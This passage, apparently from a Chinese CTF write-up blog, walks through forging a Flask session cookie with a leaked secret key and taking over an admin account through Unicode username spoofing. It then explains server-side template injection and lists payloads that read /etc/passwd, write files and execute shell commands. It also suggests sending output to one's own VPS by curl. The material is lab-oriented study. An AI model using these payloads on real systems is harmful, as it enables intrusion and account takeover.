class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</code></pre><p>注册用户abc，密码123，F12抓包得到session</p><pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_<span class="hljs-number">751</span>F<span class="hljs-number">3</span>aP<span class="hljs-number">7837</span>HjPzYMtt<span class="hljs-number">154</span>cm<span class="hljs-number">5</span>y<span class="hljs-number">7</span>Sztiy_<span class="hljs-number">0</span>nmzzY<span class="hljs-number">25</span>pNGIiFt<span class="hljs-number">0</span>JG<span class="hljs-number">9</span>DBGtXAg<span class="hljs-number">6</span>rTUszH<span class="hljs-number">2</span>eV<span class="hljs-number">8</span>KGaB<span class="hljs-number">3</span>DgzcStME<span class="hljs-number">0</span>EXAWGUQc<span class="hljs-number">05</span>mIJT<span class="hljs-number">01</span>H<span class="hljs-number">8</span>EinVmReFQ<span class="hljs-number">15</span>y<span class="hljs-number">0</span>jcjzjEwRrK<span class="hljs-number">8</span>SVI<span class="hljs-number">23</span>Zn<span class="hljs-number">61</span>Hu<span class="hljs-number">7</span>WUIpi<span class="hljs-number">0</span>AoPKOSBTH<span class="hljs-number">5</span>DPcvA<span class="hljs-number">0</span>N<span class="hljs-number">3</span>qalyaeYZ<span class="hljs-number">6</span>l<span class="hljs-number">6</span>DecKvqd_IyoJhz<span class="hljs-number">0</span>HWKOkzZc<span class="hljs-number">8</span>Q<span class="hljs-number">2</span>p<span class="hljs-number">267</span>PH-F<span class="hljs-number">9</span>vh_Qmwc<span class="hljs-number">8</span>OoGfc<span class="hljs-number">3</span>RD<span class="hljs-number">1</span>EjA<span class="hljs-number">3</span>kb<span class="hljs-number">0</span>FMCrzUGPeDXUslIfeFRUQaz<span class="hljs-number">6</span>U_dPq<span class="hljs-number">527</span>V_T<span class="hljs-number">6</span>ugarH<span class="hljs-number">4</span>nx<span class="hljs-number">1</span>VsX<span class="hljs-number">9</span>Z<span class="hljs-number">6</span>w<span class="hljs-number">0</span>bscmq<span class="hljs-number">7</span>n<span class="hljs-number">6</span>-xNGHPbzbYaq<span class="hljs-number">0</span>.YiIR<span class="hljs-number">9</span>A.ANlJjD-W<span class="hljs-number">7</span>HclEQHya-wgAX<span class="hljs-number">8</span>O<span class="hljs-number">9</span>uo; HttpOnly; Path=/</code></pre><p>要生成session需要secret_key，搜索，在config.py中找到secret_key：ckj123</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304224727300.png" alt="image-20220304224727300"></p><p>解密失败：[Decoding error] Invalid base64-encoded data</p><p><span style="background:#FF9999;"><strong>注意：解密的序列串前的点（.）不能少！而且最好用双引号、有secret_key下用key完全解密，否则解密出来还是base64的</strong></span></p><pre><code class="hljs bash">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&quot;.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo&quot;</span> -s ckj123&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;2ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;jxU5&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;</code></pre><p>看到用户abc</p><p>或者可以直接用p牛的解密脚本，无需key</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305135431149.png" alt="image-20220305135431149"></p><p>试试改为admin，+key生成session：</p><pre><code class="hljs cmd">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;<span class="hljs-number">04</span>cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">2</span>ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;, &#x27;image&#x27;: b&#x27;jxU5&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;<span class="hljs-number">10</span>&#x27;&#125;&quot; -s ckj123.eJxFkE-LwjAQxb_KkrOHNtteBA8uMaGFmVJJG5KL-KeaJqYLVVErfvetLuwe35v3e8zMg6z2fXOyZHruL82ErNodmT7Ix4ZMCbClM4wHdJCiWFpgVVzIeYpDNhSMexisBQW3QtUeZO4xlAmEjGo1EoI7PXx5HarEsNyirKiWJiDNEq1yb1wZoaidUYurcXA3SsfIRi3wiIwftcpuKOcJKH03skwLtUhQHiKUW2pE9akd98gWFGQVo_Qz8pyQ7anfr87fvun-Twi1BVreYKgoujGquNfOeHQ6gtcaox7xayF40EPuUOgE5rN3XRvWh-avad3ZGsvfSbcOzcvahbYjE3I5Nf37bySOyPMHEwhrkA.YiIoxQ.<span class="hljs-number">1</span>STJCvyLZME_COi7806tpsQssx4</code></pre><p>提交伪造session得到flag</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304225810232.png" alt="image-20220304225810232" style="zoom: 67%;"><h4 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h4><blockquote><p>参考：</p><p><a href="https://darkwing.moe/2019/11/04/HCTF-2018-admin/">https://darkwing.moe/2019/11/04/HCTF-2018-admin/</a></p><p>更多，包含其他字符欺骗（<strong>idna</strong> ）+php变量绕过：<a href="https://www.geek-share.com/detail/2798492491.html">https://www.geek-share.com/detail/2798492491.html</a></p></blockquote><p>查看源码，发现各种操作：注册，登录，修改密码，都会先对用户名小写</p><pre><code class="hljs fortran"><span class="hljs-keyword">name</span> = strlower(<span class="hljs-keyword">form</span><span class="hljs-number">.</span>username<span class="hljs-number">.</span><span class="hljs-keyword">data</span>)</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305140113647.png" alt="image-20220305140113647" style="zoom:67%;"><p>函数定义：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span>    username = nodeprep.prepare(username)    <span class="hljs-keyword">return</span> username</code></pre><p>而nodeprep是个库，from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，而源码导入的版本是10.2.0，而官网最新的版本是22.2.0，这么老的版本肯定会有漏洞</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141538923.png" alt="image-20220305141538923" style="zoom:67%;"><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141458847.png" alt="image-20220305141458847"></p><ul><li>漏洞成因：</li></ul><p>unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p><pre><code class="hljs clean">ᴬ -&gt; A -&gt; a即该函数调用第一次将其转换为大写，第二次将其转换为小写</code></pre><p><strong>所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，添加用户Admin+密码</strong></p><p><strong>我们用<code>ᴬdmin</code>进行登录，后台代码调用一次nodeprep.prepare函数，后台以为登陆的用户是Admin，检查有无这个用户+密码正确与否，然后登录成功后<code>session[&#39;name&#39;]=Admin</code>，可以看到index页面的username变成了Admin</strong></p><p><strong>登陆状态下修改密码，后台代码<code>  name = strlower(session[&#39;name&#39;])</code>,对session[‘name’]调用一次nodeprep.prepare函数，name变为<code>admin</code>,然后修改用户为admin的密码</strong></p><p>那么，攻击链大概就这样</p><ul><li>注册用户ᴬdmin</li><li>登录用户ᴬdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul><p>在index.html中可以看到只要<code>session[&#39;name&#39;]==&#39;admin&#39;</code>,也就是只要用户名是<code>admin</code>就可成功登录了</p><ul><li><p>具体字母怎么找?</p><p>关于具体编码可查 <a href="https://unicode-table.com/en/sets/superscript-and-subscript-letters/%EF%BC%8C%E5%BD%93%E7%84%B6%E4%BD%A0%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%8D%E5%88%B6%E8%BF%87%E5%90%8E%E7%94%A8%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7%E8%BD%AC%E6%8D%A2%E6%88%90Unicode%E7%BC%96%E7%A0%81%E3%80%82">https://unicode-table.com/en/sets/superscript-and-subscript-letters/，当然你也可以复制过后用站长工具转换成Unicode编码。</a></p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305145448969.png" alt="image-20220305145448969" style="zoom:67%;"></li></ul><h2 id="护网杯-2018-easy-tornado（-）"><a href="#护网杯-2018-easy-tornado（-）" class="headerlink" title="[护网杯 2018]easy_tornado（**）"></a>[护网杯 2018]easy_tornado（**）</h2><h4 id="考点：cookie-secret、模板注入"><a href="#考点：cookie-secret、模板注入" class="headerlink" title="考点：cookie_secret、模板注入"></a>考点：cookie_secret、模板注入</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227192953750.png" alt="image-20220227192953750"></p><p>点进界面，打开flag.txt，得到提示flag in /fllllllllllllag</p><p>打开welcome.txt，得到提示render</p><p>打开hints.txt，得到提示md5(cookie_secret+md5(filename))</p><p>然后每次打开文件，url里都有提交参数，filename和filehash</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227193123613.png" alt="image-20220227193123613"></p><p>猜测filehash对应的上filename才能访问，但是cookie_secret是啥呢？</p><p>抓包，查看cookie，发现并无cookie</p><p>burp抓包flag.txt那个文件，发现304 NOT modified，但是直接访问是可以访问的</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227194449791.png" alt="image-20220227194449791"></p><h4 id="304-NOT-modified"><a href="#304-NOT-modified" class="headerlink" title="304 NOT modified"></a>304 NOT modified</h4><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304">304 Not Modified</a>    ：304 未改变</p><p><a href="https://baike.baidu.com/item/304%E7%8A%B6%E6%80%81%E7%A0%81/7867141">百度百科</a></p></blockquote><p>304（未修改）    :自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</p><p>​    1. 如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应（称为 If-Modified-Since HTTP 标头）。服务器可以告诉 Googlebot 自从上次抓取后网页没有变更，进而节省带宽和开销。</p><p>​    2. HTTP 304 未改变说明无需再次传输请求的内容，也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe），例如<strong>GET 或HEAD 或在请求中附带了头部信息： If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</strong></p><p>​    3. 如果是 200 OK ，响应会带有头部 Cache-Control, Content-Location, Date, ETag, Expires，和 Vary.</p><h4 id="啥是-Cache-Control-？"><a href="#啥是-Cache-Control-？" class="headerlink" title="啥是 Cache-Control ？"></a><a href="https://zhuanlan.zhihu.com/p/79042406">啥是 Cache-Control ？</a></h4><p>​    Cache-Control 是一个 HTTP 协议中关于缓存的响应头，它由一些能够允许你定义一个响应资源应该何时、如何被缓存以及缓存多长时间的指令组成。</p><h5 id="Cache-Control-max-age"><a href="#Cache-Control-max-age" class="headerlink" title="Cache-Control max-age"></a>Cache-Control max-age</h5><p>这个指令告诉浏览器端或者中间者，响应资源能够在它被请求之后的多长时间以内被复用。例如，<code>max-age</code>等于 3600 意味着响应资源能够在接下来的 60 分钟以内被复用，<strong>而不需要从服务端重新获取</strong>。（可以发现，<code>max-age</code>的单位是秒）</p><h4 id="什么是ETag？"><a href="#什么是ETag？" class="headerlink" title="什么是ETag？"></a><a href="https://juejin.cn/post/6844903870636769293">什么是ETag？</a></h4><p>Etag是 Entity tag的缩写，可以理解为“被请求变量的实体值”，Etag是服务端的一个资源的标识，在 HTTP 响应头中将其传送到客户端。所谓的服务端资源可以是一个Web页面，也可以是JSON或XML等。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端。<strong>另一种说法是，ETag是一个可以与Web资源关联的记号（token）</strong></p><p>比如，<strong>浏览器第一次请求一个资源的时候，服务端给予返回，并且返回了ETag</strong>: “50b1c1d4f775c61:df3” 这样的字样给浏览器，当浏览器再次请求这个资源的时候，浏览器会将If-None-Match: W/“50b1c1d4f775c61:df3” 【<strong>相同ETag值</strong>】传输给服务端，服务端拿到该ETAG，对比资源是否发生变化，如果资源未发生改变，则返回304HTTP状态码，不返回具体的资源。</p><p>解题：</p><pre><code class="hljs isbl"><span class="hljs-number">1</span>.flag在/<span class="hljs-variable">fllllllllllllag</span><span class="hljs-number">2</span>.filehash：<span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span></code></pre><p>所以我们的差的就是cookie_secret了，下面开始拿cookie_secret</p><p>通过源码和请求头并没有看到任何的cookie_secret信息，当我们尝试访问/fllllllllllllag，报错</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" alt="image-20220227211937496"></p><p>思路断了，看WP才知道与304cache无关。。<strong>题目是easy_tornado，/welcome.txt页面也看到==render==，可能会是SSTI模板注入</strong></p><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入**"></a>模板注入**</h4><blockquote><p>参考：<a href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p><p><a href="https://github.com/csvoss/onelinerizer">推荐一个能把Python代码给编译成一句话的形式工具</a></p></blockquote><p>总结起来就是类似SQL注入，通过控制输入参数得到数据</p><h5 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h5><ul><li>前端开发过程：</li></ul><p>浏览器这边做的工作大致分为以下几步：</p><p>加载：根据请求的URL进行域名解析，向服务器发起请求，接收文件（HTML、JS、CSS、图象等）。</p><p>解析：对加载到的资源（HTML、JS、CSS等）进行语法解析，建议相应的内部数据结构（比如HTML的DOM树，JS的（对象）属性表，CSS的样式规则等等）</p><p><strong>渲染</strong>：构建渲染树，对各个元素进行位置计算、样式计算等等，然后根据渲染树对页面进行渲染（可以理解为“画”元素）【<strong>绘制</strong>】【<strong>将HTML变成人眼看到的图像</strong>】</p><p>这几个过程不是完全孤立的，会有交叉，比如HTML加载后就会进行解析，然后拉取HTML中指定的CSS、JS等。</p><blockquote><p>举例子：</p><p>你要吃个菜，你找到厨师说，我要尖椒肉丝。</p><p>厨师就去翻菜谱，炒给你吃。</p><p>你是浏览者</p><p>菜是你将看到的页面</p><p>厨师是浏览器</p><p>菜谱是程序员写的页面代码</p><p>炒菜的过程，就是页面渲染</p></blockquote><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a><a href="https://www.zhihu.com/question/34219998">DOM</a></h5><p>DOM是Document Object Model的英文缩写，翻译过来是文档对象模型</p><p>当浏览器读到这些代码时，它会建立一个<a href="https://javascript.info/dom-nodes">“DOM 节点”树</a>来保持追踪所有内容，如同你会画一张家谱树来追踪家庭成员的发展一样，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。【就是把HTML代码转化为树】</p><p><strong>文档对象模型就是基于这样的文档视图结构的一种模型，所有的html页面都逃不开这个模型，也可以把它称为==节点树==更为准确。</strong></p><h5 id="什么是模板"><a href="#什么是模板" class="headerlink" title="什么是模板"></a>什么是模板</h5><ul><li><p>这里特指用于 web 开发的模板引擎，是为了用户界面与业务数据（内容）分离而产生的。<br>可以生成特定格式的文档，利用模板引擎来生成前端的html代码，反馈给浏览器，呈现在用户面前。<br>大概就是一个网页的框架，</p></li><li><p>模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p></li><li><p>而造成服务器端模板注入漏洞的成因就是服务端接收了用户的恶意输入后，未经任何处理就将其作为 web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，从而导致了敏感信息的泄露、代码执行、getshell 等问题。</p></li></ul><h5 id="什么是框架"><a href="#什么是框架" class="headerlink" title="什么是框架"></a>什么是框架</h5><blockquote><p><a href="https://www.kancloud.cn/kancloud/python-basic/41708">https://www.kancloud.cn/kancloud/python-basic/41708</a></p></blockquote><ol><li><p>不管是python，还是php，亦或别的做web项目的语言，乃至于做其它非web项目的<strong>开发</strong>，一般都要用到一个称之为什么什么框架的东西。</p></li><li><p>简而言之，框架就是制定一套规范或者规则（思想），大家（程序员）在该规范或者规则（思想）下工作。或者说就是<strong>使用别人搭好的舞台，你来做表演</strong>。</p></li><li><p><span style="background:#BBFFBB;">python常见web框架</span>：</p></li></ol><ul><li>Django:这是一个被广泛应用的框架，如果看官在网上搜索，会发现很多公司在招聘的时候就说要会这个，其实这种招聘就暴露了该公司的开发水平要求不高。框架只是辅助，真正的程序员，用什么框架，都应该是根据需要而来。当然不同框架有不同的特点，需要学习一段时间。</li><li>==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2模板引擎。</li><li>Web2py：是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容Google App Engine（这是google的元计算引擎，后面我会单独介绍）。</li><li>Bottle: 微型Python Web框架，遵循WSGI，说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。</li><li>Tornado：全称是Torado Web Server，从名字上看就可知道它可以用作Web服务器，但同时它也是一个Python Web的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。</li><li>webpy: 轻量级的Python Web框架。webpy的设计理念力求精简（Keep it simple and powerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。</li></ul><h5 id="一些tornado语法："><a href="#一些tornado语法：" class="headerlink" title="一些tornado语法："></a>一些tornado语法：</h5><blockquote><p><a href="https://www.kancloud.cn/kancloud/python-basic/41713">参考手册**</a></p></blockquote><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> tornado.httpserver<span class="hljs-keyword">import</span> tornado.ioloop<span class="hljs-keyword">import</span> tornado.options<span class="hljs-keyword">import</span> tornado.web<span class="hljs-keyword">from</span> tornado.options <span class="hljs-keyword">import</span> define, optionsdefine(<span class="hljs-string">&quot;port&quot;</span>, default=<span class="hljs-number">8000</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;run on the given port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)  //指定网页访问的端口<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span>  //制定类及方法    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>        greeting = self.get_argument(<span class="hljs-string">&#x27;greeting&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>)   //获得GET参数值，前者是参数名，后面是默认值，必须        self.write(greeting + <span class="hljs-string">&#x27;, welcome you to read: www.itdiffer.com&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    tornado.options.parse_command_line()   //启动命令行    app = tornado.web.Application(handlers=[(<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler)]) //实例化，handlers类似路由，列表里每个元素有两个参数，路径和处理它的类    http_server = tornado.httpserver.HTTPServer(app)  //调用对象执行http服务器    http_server.listen(options.port)  //提供发送响应的接口    tornado.ioloop.IOLoop.instance().start()  //表示可以接收来自HTTP的请求了</code></pre><p><strong>用python运行这个文件，其实就已经发布了一个网站</strong></p><ul><li>而模板文件里，将<code>&#123;&#123;placeholder&#125;&#125;</code>理解为占位符，就是变量，看HTML模板代码中，有类似<code>&#123;&#123;username&#125;&#125;</code>的变量，模板中用`{{}}`引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中- 用``的方式，将一个字符串赋给了变量var，然后就可以直接引用这个变量了：python-tornado。这样就是实现了模板中变量的使用</li></ul><h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h5><blockquote><p><a href="https://www.freebuf.com/author/%E5%92%8C%E8%94%BC%E7%9A%84%E6%9D%A8%E5%B0%8F%E4%BA%8C">freebuf 从零学习flask模板注入**</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">csdn SSTI完全学习+工具Tplmap实例</a></p><p><a href="https://blog.csdn.net/Goodric/article/details/115170932?utm_source=app&app_version=4.20.0">csdn初识 SSTI 服务器端模板注入，有py2+py3的payload</a></p><p><a href="https://github.com/epinna/tplmap">🛠模板注入，工具Tplmap**</a></p><p><a href="https://xz.aliyun.com/t/2908">源码+ctf例题：Python中从服务端模板注入到沙盒逃逸的源码探索 (一)</a></p></blockquote><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p><ul><li>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如<span style="background:#FF9999;">Python的jinja2(Flask) mako tornado django，php的smarty twig，java的jade velocity</span>。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</li></ul><h6 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h6><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)   //python里的三引号指多行代码，%s指字符串，由变量code填充    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre><p>这段代码存在漏洞的原因是数据和代码的混淆。<strong>代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染</strong>。</p><p>尝试构造code为一串js代码，会执行js，弹窗。</p><p>而以下代码：</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)</code></pre><p>js代码被原样输出了。<strong>这是因为模板引擎一般都默认对渲染的变量值(猜测是`{{}}`)进行编码转义，这样就不会存在xss了**。在这段代码中用户**所控的是code变量，而不是模板内容**。**存在漏洞的代码中，模板内容直接受用户控制的**。不仅可以xss，还可以进行其他攻击###### SSTI文件读取/命令执行<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>构造参数8，返回执行结果8，</strong>可以看到表达式被执行了。**</p><p>那么可以<strong>通过python的对象的继承、利用可用子类的方法来一步步实现文件读取和命令执行，具体看参考链接</strong></p><p>利用：【<span style="background:#FF9999;">因为位置可能不同，所以用if查找</span>】</p><ul><li>==读文件：==</li></ul><pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;   //py2还有:().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">r&#x27;C:\1.php&#x27;</span>).read()更保险： &#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123;</span><span class="hljs-emphasis"> c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;在这里输入文件名&#x27;, &#x27;r&#x27;).read()</span><span class="hljs-emphasis"> &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; //py3</span></code></pre><ul><li>==写文件==</li></ul><pre><code class="hljs markdown">//写文件().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;</span>).write(&#x27;123&#x27;)</code></pre><ul><li>==命令执行==</li></ul><pre><code class="hljs markdown">&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2].<span class="hljs-strong">__subclasses__</span>()[71].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;还有：().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.values()[<span class="hljs-string">13</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&#x27;<span class="hljs-strong">__import__</span>(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if</span><span class="hljs-emphasis">c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123;c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  //py3</code></pre><p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye)</p><p><span style="background:#FF9999;">测试是否有注入点  2 之类的，成功执行则说明有模版注入</span></p><h6 id="下划线被过滤？"><a href="#下划线被过滤？" class="headerlink" title="下划线被过滤？"></a>下划线被过滤？</h6><p>可以用request.args获取get参数绕过</p><p>例如</p><pre><code class="hljs markdown">http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span>&amp;init=<span class="hljs-strong">__init__</span>&amp;globals=<span class="hljs-strong">__globals__</span>&amp;popen=popen&amp;cmd=cat /flag&#123;&#123;()[<span class="hljs-string">request.args.class</span>][<span 